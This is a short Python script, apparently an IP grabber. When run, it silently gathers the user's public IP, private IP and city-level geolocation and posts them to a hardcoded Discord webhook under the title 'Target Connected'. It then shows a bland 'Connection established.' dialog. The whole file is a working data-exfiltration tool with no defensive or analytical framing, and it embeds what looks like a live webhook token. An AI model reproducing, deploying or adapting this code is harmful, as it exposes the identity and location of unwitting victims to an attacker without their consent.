import requests
import socket
import json
import tkinter as tk
from tkinter import messagebox

WEBHOOK_URL = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ"

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json()["ip"]
    except:
        return "unknown"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "unknown"

def get_geolocation(public_ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5)
        data = r.json()
        return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')} ({data.get('lat')}, {data.get('lon')})"
    except:
        return "unknown"

def exfiltrate():
    pub = get_public_ip()
    priv = get_private_ip()
    geo = get_geolocation(pub)

    embed = {
        "embeds": [{
            "title": "Target Connected",
            "color": 0xff0000,
            "fields": [
                {"name": "public ip", "value": pub, "inline": False},
                {"name": "private ip", "value": priv, "inline": False},
                {"name": "geolocation", "value": geo, "inline": False},
            ]
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except:
        pass

def main():
    exfiltrate()
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("System", "Connection established.")

if __name__ == "__main__":
    main()
